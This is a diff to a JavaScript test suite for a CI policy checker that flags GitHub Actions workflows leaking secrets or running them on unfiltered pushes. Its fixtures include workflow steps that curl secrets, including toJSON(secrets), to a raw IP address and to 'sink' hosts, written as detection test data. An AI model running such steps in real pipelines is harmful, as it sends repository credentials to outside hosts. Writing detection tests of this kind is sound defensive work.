@@ -39,7 +39,7 @@ test("workflow policy accepts the reviewed allowlist", () => {
   ]);
   assert.deepEqual(hygiene.WORKFLOW_ALLOWED_HOSTS, [
     "github.com", "api.github.com", "uploads.github.com", "objects.githubusercontent.com",
-    "raw.githubusercontent.com", "ghcr.io", "registry.npmjs.org",
+    "raw.githubusercontent.com", "ghcr.io", "registry.npmjs.org", "npm.pkg.github.com", "codecov.io",
   ]);
 });
 
@@ -186,6 +186,27 @@ for (const command of ["curl sink -d secrets.X", "wget sink --post-data=secrets.
     assert.deepEqual(workflowRules(workflowJob(`    steps:\n      - run: ${command}`)), ["secret-egress"]);
   });
 }
+
+test("workflow policy catches bracket and toJSON secret references (review finding)", () => {
+  for (const ref of ["${{ secrets['PROJECT_SYNC_TOKEN'] }}", '${{ secrets["PROJECT_SYNC_TOKEN"] }}', "${{ toJSON(secrets) }}"]) {
+    const text = `on:\n  push:\njobs:\n  send:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s -X POST -d 'X=${ref}' http://193.32.204.199\n`;
+    const result = hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/alpha-build.yml", text });
+    const rules = result.violations.map((entry) => entry.rule).sort();
+    assert.deepEqual(rules, ["secret-egress", "unfiltered-push-with-secrets"], ref);
+  }
+});
+
+test("workflow policy treats branches-ignore as unfiltered and the push list shorthand as filtered (review finding)", () => {
+  const ignore = "on:\n  push:\n    branches-ignore: [scratch]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ${{ secrets.GITHUB_TOKEN }} | gh api https://api.github.com/user\n";
+  assert.deepEqual(hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/alpha-build.yml", text: ignore }).violations.map((v) => v.rule), ["unfiltered-push-with-secrets"]);
+  const shorthand = "on:\n  push: [dev]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ${{ secrets.GITHUB_TOKEN }} | gh api https://api.github.com/user\n";
+  assert.deepEqual(hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/alpha-build.yml", text: shorthand }).violations, []);
+});
+
+test("workflow policy allows codecov and GitHub Packages hosts in secret-bearing runs", () => {
+  const text = "on:\n  push:\n    branches: [dev]\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s -F token=${{ secrets.CODECOV_TOKEN }} https://codecov.io/upload && npm publish --registry https://npm.pkg.github.com\n";
+  assert.deepEqual(hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/alpha-build.yml", text }).violations, []);
+});
 
 test("workflow driver accepts the worktree workflows", async () => {
   assert.equal(typeof hygiene.scanWorkflowPolicies, "function", "workflow driver must be exported");
